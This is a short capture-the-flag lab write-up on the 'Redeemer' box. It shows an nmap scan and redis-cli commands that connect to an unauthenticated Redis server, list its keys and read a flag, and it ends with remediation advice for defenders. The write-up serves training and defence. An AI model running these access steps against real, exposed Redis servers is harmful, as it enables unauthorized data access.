# Redeemer - Redis (Port 6379)

## Objective
Exploit unauthenticated Redis database.

## 1. Recon - Nmap Scan
sudo nmap -sS -Pn -p 6379 -sV <TARGET-IP>
Result: 6379/tcp open redis Redis key-value store 5.0.7

Note: Port 6379 is NOT in Top 100 ports, so -F scan misses it. Full scan (-p-) or direct -p 6379 is required.

## 2. Enumeration - Redis CLI
redis-cli -h <TARGET-IP>
select 0
keys *

Keys Found: 4
- flag
- stor
- numb
- temp

## 3. Exploitation - Get Flag
get flag

## Vulnerability
- Redis exposed to internet with NO authentication
- In-memory Database - Data in RAM, fast but insecure if exposed

## Remediation (SOC Perspective)
- Enable AUTH (requirepass) in redis.conf
- Bind Redis to 127.0.0.1 only, block 6379 on firewall
- Disable dangerous commands - FLUSHALL, CONFIG
- Alert on external connections to 6379

## Skill Learned
NoSQL / In-memory DB enumeration, Redis CLI, Key-value exploitation
